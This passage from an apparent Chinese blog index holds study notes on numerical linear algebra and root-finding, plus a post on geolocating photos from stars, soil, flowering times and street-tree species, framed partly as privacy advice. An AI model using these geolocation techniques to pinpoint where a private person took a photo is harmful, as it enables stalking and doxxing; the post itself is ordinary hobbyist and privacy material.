\\sum_{k=i+1}^{n} l_{ki} x_k)/l_{ii}, \\quad i = n, n-1, \\ldots, 1\n\\end{cases}\n{yi​=(bi​−∑k=1i−1​lik​yk​)/lii​,i=1,2,…,nxi​=(yi​−∑k=i+1n​lki​xk​)/lii​,i=n,n−1,…,1​\n由矩阵分解公式可知\naii=∑k=1ilik2a_{ii} = \\sum_{k=1}^{i} l_{ik}^2\naii​=k=1∑i​lik2​\n∣lik∣≤aii,k≤i|l_{ik}| \\leq \\sqrt{a_{ii}}, \\quad k \\leq i\n∣lik​∣≤aii​​,k≤i\n\n平方根法所求得的中间量lkk是可控的，即舍入误差的增长也可控\n平方根法解正定方程组的缺点是需要进行开方运算\n\n 改进平方根法\n将对称正定矩阵A=(aij)n×n进行LDLT分解，可避免开方运算，其中D=diag(di)，且di＞0，L为单位下三角矩阵，则\n(a11⋯a1n⋱⋮aij⋮⋱an1⋯ann)=(1l211⋮⋮⋱ln1ln2⋯1)(d1d2⋱dn)(1l21l31⋯ln11l32⋯ln2⋱⋱⋮1lnj1)\\begin{pmatrix}\na_{11} &amp; &amp; \\cdots&amp;  &amp; a_{1n} \\\\\n &amp;\\ddots&amp; &amp; &amp; \\\\\n\\vdots&amp;  &amp; a_{ij} &amp; &amp; \\vdots \\\\\n &amp; &amp; &amp;\\ddots &amp; \\\\\na_{n1} &amp; &amp; \\cdots &amp; &amp; a_{nn}\n\\end{pmatrix}\n=\n\\begin{pmatrix}\n1 &amp; &amp; \\\\\nl_{21} &amp; 1 &amp; \\\\\n\\vdots &amp; \\vdots &amp; \\ddots \\\\\nl_{n1} &amp; l_{n2} &amp; \\cdots &amp; 1\n\\end{pmatrix}\n\\begin{pmatrix}\nd_1 &amp; &amp; \\\\\n&amp; d_2 &amp; \\\\\n&amp; &amp; \\ddots &amp; \\\\\n&amp; &amp; &amp; d_n\n\\end{pmatrix}\n\\begin{pmatrix}\n1 &amp; l_{21} &amp; l_{31} &amp; \\cdots &amp; l_{n1} \\\\\n&amp; 1 &amp; l_{32} &amp; \\cdots &amp; l_{n2} \\\\\n&amp; &amp; \\ddots &amp; \\ddots &amp; \\vdots \\\\\n&amp; &amp; &amp; 1 &amp; l_{nj} \\\\\n&amp; &amp; &amp; &amp; 1\n\\end{pmatrix}\n⎝⎜⎜⎜⎜⎜⎜⎛​a11​⋮an1​​⋱​⋯aij​⋯​⋱​a1n​⋮ann​​⎠⎟⎟⎟⎟⎟⎟⎞​=⎝⎜⎜⎜⎜⎛​1l21​⋮ln1​​1⋮ln2​​⋱⋯​1​⎠⎟⎟⎟⎟⎞​⎝⎜⎜⎜⎛​d1​​d2​​⋱​dn​​⎠⎟⎟⎟⎞​⎝⎜⎜⎜⎜⎜⎜⎛​1​l21​1​l31​l32​⋱​⋯⋯⋱1​ln1​ln2​⋮lnj​1​⎠⎟⎟⎟⎟⎟⎟⎞​\n\n对=1,2,…,n有\n{lij=(aij−∑k=1j−1likdkljk)/dj,j=1,2,…,i−1di=aii−∑k=1i−1dklik2\\begin{cases}\nl_{ij} = \\left( a_{ij} - \\sum_{k=1}^{j-1} l_{ik} d_k l_{jk} \\right) / d_j, &amp; j = 1, 2, \\ldots, i-1 \\\\\nd_i = a_{ii} - \\sum_{k=1}^{i-1} d_k l_{ik}^2\n\\end{cases}\n{lij​=(aij​−∑k=1j−1​lik​dk​ljk​)/dj​,di​=aii​−∑k=1i−1​dk​lik2​​j=1,2,…,i−1\n按此方式进行LDLT分解避免了开方运算，但在计算每个元时多了相乘的因子，为避免重复计算，进行如下变换：A=LDLT=TLT，其中T=LD，辅助变量tij=lijdj\n\n代入得对于i=1,2,…,n计算\n{tij=aij−∑k=1j−1tikljk,j=1,2,⋯ ,i−1lij=tijdj,j=1,2,⋯ ,i−1di=aii−∑k=1i−1tiklik\\left\\{\n\\begin{array}{l}\nt_{ij} = a_{ij} - \\sum_{k=1}^{j-1} t_{ik} l_{jk}, \\quad j = 1, 2, \\cdots, i-1 \\\\\nl_{ij} = \\frac{t_{ij}}{d_j}, \\quad j = 1, 2, \\cdots, i-1 \\\\\nd_i = a_{ii} - \\sum_{k=1}^{i-1} t_{ik} l_{ik}\n\\end{array}\n\\right.\n⎩⎪⎪⎨⎪⎪⎧​tij​=aij​−∑k=1j−1​tik​ljk​,j=1,2,⋯,i−1lij​=dj​tij​​,j=1,2,⋯,i−1di​=aii​−∑k=1i−1​tik​lik​​\n\n求解对称正定方程组\n\nAx=b等价于求解L(DLTx)=b，可分解成由Ly=b求y，再由DLTx=y求x\n{yi=bi−∑k=1i−1likyk,i=1,2,⋯ ,nxi=yidi−∑k=i+1nlkixk,i=n,n−1,⋯ ,1\\left\\{\n\\begin{array}{l}\ny_i = b_i - \\sum_{k=1}^{i-1} l_{ik} y_k, \\quad i = 1, 2, \\cdots, n \\\\\nx_i = \\frac{y_i}{d_i} - \\sum_{k=i+1}^{n} l_{ki} x_k, \\quad i = n, n-1, \\cdots, 1\n\\end{array}\n\\right.\n{yi​=bi​−∑k=1i−1​lik​yk​,i=1,2,⋯,nxi​=di​yi​​−∑k=i+1n​lki​xk​,i=n,n−1,⋯,1​\n 范数\n 向量范数\n\n1-范数（绝对值范数）\n\n∥x∥1=∑i=1n∣xi∣=∣x1∣+∣x2∣+⋯+∣xn∣\\|x\\|_1 = \\sum_{i=1}^{n} |x_i| = |x_1| + |x_2| + \\cdots + |x_n|\n∥x∥1​=i=1∑n​∣xi​∣=∣x1​∣+∣x2​∣+⋯+∣xn​∣\n\n2-范数（欧几里得范数）\n\n∥x∥2=(∑i=1nxi2)12=x12+x22+⋯+xn2\\|x\\|_2 = \\left( \\sum_{i=1}^{n} x_i^2 \\right)^{\\frac{1}{2}} = \\sqrt{x_1^2 + x_2^2 + \\cdots + x_n^2}\n∥x∥2​=(i=1∑n​xi2​)21​=x12​+x22​+⋯+xn2​​\n\n∞-范数（最大范数）\n\n∥x∥∞=max⁡1≤i≤n∣xi∣=max⁡i{∣x1∣,∣x2∣,⋯ ,∣xn∣}\\|x\\|_\\infty = \\max_{1 \\leq i \\leq n} |x_i| = \\max_i \\{|x_1|, |x_2|, \\cdots, |x_n|\\}\n∥x∥∞​=1≤i≤nmax​∣xi​∣=imax​{∣x1​∣,∣x2​∣,⋯,∣xn​∣}\n 矩阵范数\n\n行范数\n\n∥A∥∞=max⁡1≤i≤n∑j=1n∣aij∣\\|A\\|_\\infty = \\max_{1 \\leq i \\leq n} \\sum_{j=1}^{n} |a_{ij}|\n∥A∥∞​=1≤i≤nmax​j=1∑n​∣aij​∣\n\n列范数\n\n∥A∥1=max⁡1≤j≤n∑i=1n∣aij∣\\|A\\|_1 = \\max_{1 \\leq j \\leq n} \\sum_{i=1}^{n} |a_{ij}|\n∥A∥1​=1≤j≤nmax​i=1∑n​∣aij​∣\n\n谱范数\n\n∥A∥2=λmax⁡(ATA)\\|A\\|_2 = \\sqrt{\\lambda_{\\max}(A^T A)}\n∥A∥2​=λmax​(ATA)​\n其中λmax(ATA)表示矩阵ATA的最大特征值\n\n假设我们有一个2×2的矩阵A：\nA=(3113)A=\\begin{pmatrix}3&amp;1\\\\1&amp;3\\end{pmatrix}\nA=(31​13​)\n想要找到这个矩阵的特征值。首先，我们需要解特征方程，即det⁡(A−λI)=0，其中I是单位矩阵，λ是特征值\n矩阵A的特征方程是\ndet⁡(3−λ113−λ)=0\\det \\begin{pmatrix}3-\\lambda&amp;1\\\\1&amp;3-\\lambda\\end{pmatrix}=0\ndet(3−λ1​13−λ​)=0\n(3−λ)(3−λ)−1⋅1=0(3-\\lambda)(3-\\lambda)-1\\cdot1=0\n(3−λ)(3−λ)−1⋅1=0\nλ2−6λ+8=0\\lambda^2-6\\lambda+8=0\nλ2−6λ+8=0\nλ1=4,λ2=2\\lambda_1=4,\\lambda_2=2\nλ1​=4,λ2​=2\n则矩阵A的最大特征值是λ1=4\n\n\nF范数\n\n∥A∥F=∑i=1m∑j=1naij2\\|A\\|_F = \\sqrt{\\sum_{i=1}^{m} \\sum_{j=1}^{n} a_{ij}^2}\n∥A∥F​=i=1∑m​j=1∑n​aij2​​\n 迭代法\n已知线性方程组Ax=b，其中A∈Rn×n，b∈Rn，A非奇异，设找到一个等价方程组x=Bx+f，从而建立迭代格式\nx(k+1)=Bx(k)+f,k=0,1,⋯x^{(k+1)}= Bx^{(k)} + f, \\quad k = 0, 1, \\cdots \\\\\nx(k+1)=Bx(k)+f,k=0,1,⋯\n当给定初始向量x(0)后，可按上式迭代，得到迭代向量序列{x(k)}，当k→+∞时，x(k)→x*，则x*是线性方程组Ax=b的解\n对线性方程组Ax=b用等价方程x=Bx+f建立迭代格式x(k+1)=Bx(k)+f，k=0,1,…逐步求解的方法叫迭代法。若lim⁡k→+∞x(k)=x∗\\lim_{k \\to +\\infty} x^{(k)}= x^*limk→+∞​x(k)=x∗，则称迭代法收敛，x*即方程组的解，否则称此迭代法发散\n 雅可比迭代\n∑j=1naijxj=bi,i=1,2,⋯ ,n\\sum_{j=1}^{n} a_{ij} x_{j} = b_{i}, \\quad i=1,2,\\cdots, n\nj=1∑n​aij​xj​=bi​,i=1,2,⋯,n\n\n设aii≠0，从上式中分离出变量xi，将它改写成\nxi=1aii(bi−∑j=1,j≠inaijxj),i=1,2,⋯ ,nx_{i} = \\frac{1}{a_{ii}}\\left(b_{i} - \\sum_{j=1, j\\neq i}^{n} a_{ij} x_{j}\\right), \\quad i=1,2,\\cdots,n\nxi​=aii​1​⎝⎛​bi​−j=1,j=i∑n​aij​xj​⎠⎞​,i=1,2,⋯,n\n\n据此建立得到雅可比迭代公式\nxi(k+1)=1aii(bi−∑j=1,j≠inaijxj(k)),i=1,2,⋯ ,nx_{i}^{(k+1)} = \\frac{1}{a_{ii}}\\left(b_{i} - \\sum_{j=1,j\\neq i}^{n} a_{ij} x_{j}^{(k)}\\right), \\quad i=1,2,\\cdots, n\nxi(k+1)​=aii​1​⎝⎛​bi​−j=1,j=i∑n​aij​xj(k)​⎠⎞​,i=1,2,⋯,n\nxi(k+1)=1aii(bi−∑j=1i−1aijxj(k)−∑j=i+1naijxj(k)),i=1,2,⋯ ,nx_{i}^{(k+1)} = \\frac{1}{a_{ii}}\\left(b_{i} - \\sum_{j=1}^{i-1} a_{ij} x_{j}^{(k)} - \\sum_{j=i+1}^{n} a_{ij} x_{j}^{(k)}\\right), \\quad i=1,2,\\cdots, n\nxi(k+1)​=aii​1​(bi​−j=1∑i−1​aij​xj(k)​−j=i+1∑n​aij​xj(k)​),i=1,2,⋯,n\n\n 迭代的收敛性\n\n谱半径\n\n矩阵A∈Rn×n的所有特征值λi（i=1,2,…,n）的模的最大值称为矩阵A的谱半径ρ(A)\nρ(A)=max⁡1≤i≤n∣λi∣\\rho (A)= \\max_{1 \\leq i \\leq n}|\\lambda_i|\nρ(A)=1≤i≤nmax​∣λi​∣\n\n矩阵A的谱半径不超过矩阵A的任一种范数||A||\n\n","tags":["数值分析"]},{"title":"非线性方程的数值解法","url":"/2024/11/16/%E9%9D%9E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%9A%84%E6%95%B0%E5%80%BC%E8%A7%A3%E6%B3%95/","content":" 非线性方程的数值解法\n\n 划界法\n\n方程的根\n\n使用如下条件判断重根\n设函数f(x)有m阶连续导数，方程f(x)=0有m重根x*的充要条件是\nf(x∗)=f′(x∗)=⋯=f(m−1)(x∗)=0,f(m)(x∗)≠0f(x^*) = f'(x^*) = \\cdots = f^{(m-1)}(x^*) = 0, \\quad f^{(m)}(x^*) \\neq 0\nf(x∗)=f′(x∗)=⋯=f(m−1)(x∗)=0,f(m)(x∗)=0\n 逐步搜索法\n设单值连续函数f(x)在有根区间[a,b]，不妨假定f(a)&lt;0，从x0=a出发，按预定步长h（譬如取h=(b-a)/N，N为正整数），检查点xk=a+kh，k=1,2,…上的函数值f(xk)的符号，一旦发现xk处与a处函数值异号，即f(xk)&gt;0，则可确定一个缩小了的有根区间[xk-1,xk]，其宽度等于预定的步长h。可能有f(xk)=0，这时xk即为所求的根\n 二分法\n将有根区间[a,b]用中点x0=(a+b)/2分成两半，计算函数值f((a+b)/2)。若f((a+b)/2)=0，就得到方程的实根x*=(a+b)/2，否则检查f(x0)与f(a)是否同号，如同号，说明所求的根x*在x0的右侧，这时令a1=x0，b1=b；否则，x*在x0的左侧，这时令a1=a，b1=x0，这样新的有根区间[a1,b1]的长度为原有根区间[a,b]的一半\n误差\n∣x∗−xk∣≤12(bk−ak)=12k+1(b−a)\\left| x^* - x_k \\right| \\leq \\frac{1}{2} (b_k - a_k) = \\frac{1}{2^{k+1}} (b - a)\n∣x∗−xk​∣≤21​(bk​−ak​)=2k+11​(b−a)\n若事先给定误差为ε，则只需\n∣x∗−xk∣≤12k+1(b−a)&lt;ε\\left| x^* - x_k \\right| \\leq \\frac{1}{2^{k+1}} (b - a) &lt; \\varepsilon\n∣x∗−xk​∣≤2k+11​(b−a)&lt;ε\n\n收敛速度与比值为1/2的等比数相同\n局限性：只能求单根\n\n 迭代法\n对于一般连续函数方程f(x)=0，改写成等价形式方程x=φ(x)\n\n迭代法收敛才能用\n\n全局收敛性\n\n设函数φ(x)在区间[a,b]上具有连续的一阶导数，且满足\n1.对所有的x∈[a,b]有φ(x)∈[a,b]\n2.存在0&lt;L&lt;1，使所有的x∈[a,b]，有\n∣φ′(x)∣≤L|\\varphi'(x)|\\leq L\n∣φ′(x)∣≤L\n则方程x=φ(x)在区间[a,b]上的解x*存在且唯一，对任意的x0∈[a,b]，迭代过程xk+1=φ(xk)均收敛于x*\n且L越小，收敛速度越快\n\n局部收敛性\n\n设φ(x)在x=φ(x)的根x*邻域有连续的一阶导数，且\n∣φ′(x∗)∣&lt;1\\left| \\varphi'(x^*) \\right| &lt; 1\n∣φ′(x∗)∣&lt;1\n则迭代过程xk+1=φ(k)具有局部收敛性\n\n\n 收敛速度\n设迭代过程xk+1=φ(xk)收敛于x=φ(x)的根x*，令迭代误差ek=xk-x*，若存在常数p(p≥1)和c(c＞0)，使\nlim⁡k→+∞∣ek+1∣∣ek∣p=c\\lim_{k\\rightarrow+\\infty}\\frac{\\left|e_{k+1}\\right|}{\\left|e_{k}\\right|^{p}}=c\nk→+∞lim​∣ek​∣p∣ek+1​∣​=c\n则称序列{xk}是p级收敛的，c称渐进误差常数\n\n对迭代过程xk+1=φ(xk)，若φ(p)(x)在所求根x*的邻域连续，且\nφ′(x∗)=φ′′(x∗)=⋯=φ(p−1)(x∗)=0,φ(p)(x∗)≠0\\varphi'(x^*) = \\varphi''(x^*) = \\cdots = \\varphi^{(p-1)}(x^*) = 0, \\quad \\varphi^{(p)}(x^*) \\neq 0\nφ′(x∗)=φ′′(x∗)=⋯=φ(p−1)(x∗)=0,φ(p)(x∗)=0\n则迭代过程在x*邻域是p阶收敛的\n\np=1,0&lt;c&lt;1时称线性收敛，p=2时称平方收敛，p&gt;1时称超线性收敛\n\n迭代过程的收敛速度依赖于迭代函数φ(x)的选取。当φ’(x*)≠0时，则该迭代过程最多是线性收敛，当φ’(x*)=0时，迭代过程至少是平方收敛\n 迭代加速\n 埃特金加速\n设序列{xk}线性收敛到x*，记\nxˉk+1=xk−(Δxk)2Δ2xk,k=0,1,…\\bar{x}_{k+1} = x_k - \\frac{(\\Delta x_k)^2}{\\Delta^2 x_k}, \\quad k = 0, 1, \\ldots\nxˉk+1​=xk​−Δ2xk​(Δxk​)2​,k=0,1,…\n其中△xk=xk+1-xk是xk点的一阶差分，△2xk=xk+2-2xk+1+xk是xk点的二阶差分\n 斯蒂芬森迭代\n当把不动点迭代法和埃特金加速法结合起来即得到斯蒂芬森迭代法，即\n{yk=φ(xk)zk=φ(yk)xk+1=xk−(yk−xk)2zk−2yk+xk\\begin{cases}\ny_k = \\varphi(x_k) \\\\\nz_k = \\varphi(y_k) \\\\\nx_{k+1} = x_k - \\frac{(y_k - x_k)^2}{z_k - 2y_k + x_k}\n\\end{cases}\n⎩⎪⎪⎨⎪⎪⎧​yk​=φ(xk​)zk​=φ(yk​)xk+1​=xk​−zk​−2yk​+xk​(yk​−xk​)2​​\n即\nxk+1=xk−(f(xk)−xk)2f(f(xk))−2f(xk)+xkx_{k+1} = x_k - \\frac{(f(x_k) - x_k)^2}{f(f(x_k)) - 2f(x_k) + x_k}\nxk+1​=xk​−f(f(xk​))−2f(xk​)+xk​(f(xk​)−xk​)2​\n\n不收敛的迭代可用斯蒂芬森让其至少平方收敛\n\n 牛顿迭代法\nxk+1=xk−f(xk)f′(xk)x_{k+1} = x_k - \\frac{f(x_k)}{f'(x_k)}\nxk+1​=xk​−f′(xk​)f(xk​)​\n设函数f(x)满足f(x*)=0,f'(x*)≠0，且f''(x)在x*邻域连续，则牛顿迭代法在x*局部收敛，且至少二阶收敛。并有\nlim⁡k→+∞ek+1ek2=f′′(x∗)2f′(x∗)\\lim_{k\\rightarrow+\\infty} \\frac{e_{k+1}}{e_k^2} = \\frac{f''(x^*)}{2f'(x^*)}\nk→+∞lim​ek2​ek+1​​=2f′(x∗)f′′(x∗)​\n\n优点：收敛性速度快\n缺点：每次要计算导数f'(xk)，计算量大\n\n\n 牛顿下山法\n要求迭代过程对所选的初值能达到使函数值单调下降，即要满足下山条件|f(xk+1)|＜|f(xk)|\nxk+1=xk−λf(xk)f′(xk)x_{k+1} = x_k - \\lambda \\frac{f(x_k)}{f'(x_k)}\nxk+1​=xk​−λf′(xk​)f(xk​)​\n其中λ称为下山因子。通过适当选取下山因子λ保证函数值f(xk)能单调下降。下山因子的选择是逐步探索进行的，从λ=1开始反复将 λ的值减半进行试算\n\nλ≠1时只有线性收敛速度\n\n\n当重根数已知时，设x*是f(x)=0的m重根(m≥2)，即满足\nf(x∗)=f′(x∗)=⋯=f(m−1)(x∗)=0,f(m)(x∗)≠0f(x^*) = f'(x^*) = \\cdots = f^{(m-1)}(x^*) = 0, \\quad f^{(m)}(x^*) \\neq 0\nf(x∗)=f′(x∗)=⋯=f(m−1)(x∗)=0,f(m)(x∗)=0\n则牛顿迭代法迭代过程是线性收敛，不是平方收敛\n\n\n修正的牛顿迭代法：\n\nxk+1=xk−mf(xk)f′(xk)x_{k+1} = x_k - m \\frac{f(x_k)}{f'(x_k)}\nxk+1​=xk​−mf′(xk​)f(xk​)​\n此时平方收敛，但是需要预知重根数m的值\n\n无需知道重根数的修正牛顿迭代法：\n\nxk+1=xk−f′(xk)f(xk)f′(xk)2−f(xk)f′′(xk),k=0,1,…x_{k+1} = x_k - \\frac{f'(x_k) f(x_k)}{f'(x_k)^2 - f(x_k) f''(x_k)}, \\quad k = 0, 1, \\ldots\nxk+1​=xk​−f′(xk​)2−f(xk​)f′′(xk​)f′(xk​)f(xk​)​,k=0,1,…\n 弦截法\n为了避免计算导数，改用差商代替导数。弦截法又分单点弦法和双点弦法。双点弦法的收敛速度低于牛顿迭代法，但又高于不动点迭代法\n 单点弦截法\n设方程f(x)=0，在区间[x0,x1]上有唯一根x*，选f(x)=0上的两点(x0,f(x0))和(x1,f(x1))作弦（直线），则有两点式方程\nf(x)=f(x1)+f(x1)−f(x0)x1−x0(x−x1)f(x) = f(x_1) + \\frac{f(x_1) - f(x_0)}{x_1 - x_0}(x - x_1)\nf(x)=f(x1​)+x1​−x0​f(x1​)−f(x0​)​(x−x1​)\n写成迭代格式\nxk+1=xk−f(xk)f(xk)−f(x0)(xk−x0),k=1,2,⋯x_{k+1} = x_k - \\frac{f(x_k)}{f(x_k) - f(x_0)}(x_k - x_0), \\quad k = 1, 2, \\cdots\nxk+1​=xk​−f(xk​)−f(x0​)f(xk​)​(xk​−x0​),k=1,2,⋯\n几何意义：过两个点作弦，这个弦和x轴的交点即是根的新的近似值，因为弦的一个端点(x0, f(x0))始终不变，只有另一个端点变动，所以这种方法称为单点弦法\n 双点弦法\n用差商(f(xk)-f(xk-1))/(xk-xk-1)替代牛顿迭代公式中的导数f’(x)，导出\nxk+1=xk−f(xk)f(xk)−f(xk−1)(xk−xk−1),k=1,2,…x_{k+1} = x_k - \\frac{f(x_k)}{f(x_k) - f(x_{k-1})}(x_k - x_{k-1}), \\quad k = 1, 2, \\ldots\nxk+1​=xk​−f(xk​)−f(xk−1​)f(xk​)​(xk​−xk−1​),k=1,2,…\n称为双点弦法\n\n双点弦法收敛速度比单点弦截法快，仅稍慢于牛顿法，是超线性收敛\n\n\n","tags":["数值分析"]},{"title":"社工信息搜集","url":"/2024/03/18/%E7%A4%BE%E5%B7%A5%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","content":" 社工信息搜集\nBV1Jk4y1S7H7\n\n推荐up主：宇科君、地图侦探、地球百科君、MU芝士语言学\n\nStellarium\n图寻文档\n 星空定位经纬度\nBV1YW421973A\n假设天上两卫星，以其中一个卫星为圆心和你的距离为半径画一个球体，这个球体和地球交线为一个圆，你只可能在这个圆上\n\n另一个如法炮制，则一个球和一个圆焦点只有两个点，你一定在这两个点上\n\n此时如果以你为原点，两颗卫星的相对位置会为你排除其中一个点，你的位置就能确定。如果天上卫星越多，就越精确\n\n对于星星可视作无穷远距离，我们假设它们都在一个单位球上即可\n\n\n以该图为例图，图中位于上方的消失点是天顶（0,0,1），再通过焦距计算出每个恒星的球坐标，因为以赤道算\n\n\n恒星的赤经、赤纬是确定的\n\n则我们就能将赤经转换为地平线坐标下的时角，也能将赤道坐标的北极点转化为地平坐标，那么纬度和地方时就知道了\n赤经/赤纬（当前日期纪元）：10h47m41s/+7°07&#x27;51&quot;时角/赤纬：15h20m36s/+7°07&#x27;51&quot;方位角/高度角：+63°25&#x27;22&quot;/-31°35&#x27;34&quot;\n如果知道时间，还能确定经度，当然，就算不知道时间，如果图片中能看到月亮，或者图片清晰度较高且能看到金星或者火星，也能确定位置，因为这三个离我们比较近\n\n比如金星，将位置调离当前位置10个经度、10个纬度，金星的赤经和赤纬分别变化了1秒和2秒\n当前位置：114.514E,40.1920N调至124.514E,30.1920N时金星赤经-1秒，赤纬+2秒\n 注意事项\n发星空照片时\n\n\n最好不要有任何地景，这样便无法确定天顶在哪。如果主要目的是夜景，请处理图片时将照片中的星星拉到看不见；如果主要目的是星空，一般专业的天问摄影者才会追求照片的不一致而附带地景。\n如果你希望带地景，最好不要发出来，或者只有树木这种不笔直的难以用来确认天顶的景物也是可以的。\n\n\n不要即拍即发。一般情况下专业的天问摄影者带地景的照片也都是回去叠加等处理之后才发出来的，你也可以在拍完回到室内后修一修，然后定时发表，不要透露拍摄的真实时间。\n\n\n如果主要目的是拍月球，不要把曝光拉太高，否则会把边上恒星拍进来。\n\n\n照片中请勿出现南门二或水委一，否则认识星星的人一眼就知道你大概率在海南（小概率在广东、福建、台湾、广西、云南）。当然要在国外旅游的话那没事。\n\n\n\n 土壤、植物、物候粗略定位\n 土壤\n\n黑土\n\n集中于黑龙江、吉林等东北平原\n\n\n青土\n\n集中在长江中下游、珠江三角洲等水田区\n\n\n红土\n\n遍布在江西、湖南、云南、福建、海南等南方地区\n\n\n白土\n\n分布于西部地区\n\n\n黄土\n\n分布于陕西、山西等黄土高原，疏松易蚀\n\n 物候\n春天的时候，武汉和哈尔滨物候能差50天\n\n\n物候加减算法：BV1p5411o7Qi\nPPBC中国植物图像库\n+代表比此地早相应天数，-代表比此地晚相应天数\n2-5月物候差：\n\n9月物候差：\n\n\n只要算花期在范围内的地方就行，如果能从照片中看出是始花还是盛花还是开败，还能更加精确\n尤其是春季花卉主力军蔷薇科，从初花到开败总共就十天出头。\n\n花期最短的是紫叶稠李，只有7天左右，其他李属植物比如桃杏李大多数在十一二天，苹果属的比如各种海棠和梨属的稍微长点，绣线菊属的最长，但也不超过20天。只有月季和棣棠等一些培育品种花期可以长达几个月。\n\n 植被\n软件推荐：形色\n国内高原、草原、荒漠、寒温带、中温带、暖温带、亚热带、热带的典型植被网上图片一大堆\n用普通植物确定位置就是一个平面规划，用每种植物的分布取交集\n\n\n全球生物多样性信息设施（GBIF）：有所有植物的观察到的地点，搜索要用学名\n\nGBIF最大的问题是不能保证鉴定正确，当然对于普通人来说是完全够用的\n\n例如槭叶铁线莲，西南的这些点全部是错误鉴定\n但对于大多数常见的植物来说，只要正确鉴定足够多，错误鉴定的地点就能一眼看出来\n\n\n 实战\n\n孤独摇滚第九集\n可辨认出三种植物：鹅掌柴、贯众、玉竹\n\n玉竹亚欧广泛分布不考虑。鹅掌柴是很典型的热带植物。因为现在有很多室内种植，所以GBIF上的点可信度就比较低了，我们翻国内标本，最北的是浙江平阳\n\n虽然最北的是浙江平阳，但是平均气温最低的产地是贵州紫云，故后续按照紫云算\n\n\n再找到日本一月最低气温图，可以把地点确定到本州岛东南近岸以及更南\n\n贯众是典型的温带植物，从分布可看出只要一到南亚热带就没了\n\n贯众：\n广东：乳源、乐昌、平远、阳山、英德\n广西：武鸣、马山、融水、阳朔、临桂、兴安、龙胜、资源、百色、德保、凌云、田林、隆林、东兰、珠江、龙州\n\n这样再排除琉球群岛和九州岛南部，这样面积已经缩小到约7万平方公里的区域了，相当于一个重庆\n\n 行道树\n35种及危险等级，危险等级越高的越不要在自己发表的照片中出现\n下图中如果上色是暖色调为主，若非特殊说明，则红色一般代表很大可能会作为行道树的地方\n橙色代表有但是不太可能当做行道树大规模种植的地区\n如果只涂了蓝色则蓝色代表没有这种树的地区，其他地方都有可能用来做行道树\n\n白桦和岳桦\n\n红色和橙色代表白桦，深红色区域白桦岳桦都有，两种都是典型的东北行道树，危险等级高\n\n\n白蜡树\n\n全国大多数地区都有，尤其是东北和西北会更多地用作行道树，但是各地会种一些具有地方特色的同属物种，比如东北的水曲柳，云南的楷叶梣，湖北的湖北梣，新疆的小叶梣等，如果能认出这些来危险度极高，所以建议拍白蜡树前用识花软件识别一下\n\n\n垂柳\n\n基本全国都有，水边多一些，危险程度低\n\n\n刺槐\n\n早已入侵全国大多数地区，但只有三北这片没什么好的绿化树种的才会用作行道树，危险程度高\n\n\n杜仲\n\n中国特产，除了不耐冷，哪都能种，危险程度较低\n\n\n盾柱木禾银荆\n\n豆科的两种树，红色代表二者都有，橙色代表只有银荆，北方人甚至都没听说过这是啥，危险程度极高\n\n\n鹅掌楸\n\n主要在暖温带和亚热带，危险程度中\n\n\n法国梧桐\n\n作为行道树的绝佳材料，目前几乎全国各地都栽种，危险程度低\n\n\n高山榕\n\n以高山榕为代表的各类榕属行道树只分布在热带，尤以闽语区较多，危险程度极高\n\n榕属重庆也很常见，小叶榕大叶榕\n\n\n\n国槐\n\n现在很多地方也都有了，不过还是北方更倾向用，危险程度较低\n\n\n旱柳\n\n基本全国都有，但也是只有北方相对干旱才会选择较多一些，危险程度中等\n\n\n合欢\n\n只有非常冷的地方没有，危险程度低\n\n\n黑杨&amp;加杨\n\n前者主要以北方为主，尤其以新疆为甚，后者在南方也会种一些，危险程度是较高和较低\n\n\n黄花风铃木\n\n虽然整个北回归线附近都标红了，但还是广东种得最多，危险程度极高\n\n\n金钱松\n\n典型的长江流域植物，黄淮流域也会有一点，危险程度较高\n\n\n辽椴&amp;椴树\n\n典型的以秦岭-淮河为界分布的物种，因为材貌双全，全国各地都有作为行道树，橙色是分布区边缘，种植较少，黄色是过渡带，种植也较少，危险程度偏高\n\n\n栾树\n\n主要区域是汉地十八省，危险程度较低\n\n\n落叶松\n\n典型的三北地区的行道树，一般也是因为比较冷才会种这个，危险程度高\n\n\n毛白杨\n\n分布比较广，但也只有北方常用来作行道树，危险程度比较高\n\n\n毛泡桐&amp;兰考泡桐\n\n比较少见的行道树，但非常特色，比如北京地铁亦庄线两侧，红色区域二者兼有，橙色基本只有兰考桐，浅橙色基本只有毛泡桐，危险程度较高\n\n\n美丽异木棉\n\n热带季风气候专属，危险程度极高\n\n\n木棉\n\n比异木棉好点，危险程度高\n\n深圳好多\n\n\n\n南洋杉\n\n听名字就知道不是北方的东西，危险程度高\n\n四川也有\n\n\n\n七叶树\n\n除了果实非常大可能会砸到人，其它都完美的行道树，现在暖温带和亚热带广泛种植，危险程度中等\n\n\n梧桐\n\n一种不耐寒的树，主要还是南方多（但是太原和青岛也有）\n\n\n香樟树&amp;桂花\n\n这俩八竿子打不着，但分布差不多都是黄河以南，危险程度中高\n\n南昌、苏州全是这两种\n\n\n\n银杏\n\n2.7亿岁的up主，现在全国各地都有粉丝，但作为典型的温带树种，南岭以南、长城以北还是活不了\n\n赤峰、呼和浩特也有\n\n\n\n各类枫树\n\n红色代表元宝槭鸡爪槭都有，浅橙色代表只有鸡爪槭，橙色代表只有元宝槭，深红色则更多是当地的枫树物种，当然别处也有自己的，比如东北的三花槭，湖北的房县槭，云南的漾濞槭。元宝槭和鸡爪槭危险程度低，其它的建议先识花\n\n\n梓属物种\n\n以楸树、梓树和黄金树为代表的梓属物种，依然是除了特别冷和特别热的地方，全国都有，危险程度低\n\n","tags":["Summary"]},{"title":"软件工程","url":"/2024/02/29/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/","content":" 软件工程\n 一、软件工程概述\nRational Rose\n软件=程序+数据+文档\n软件工程：用工程化的方法指导计算机软件开发和维护的一门工程学科\n软件工程包括软件开发技术（过程、方法和工具）与软件工程管理\n 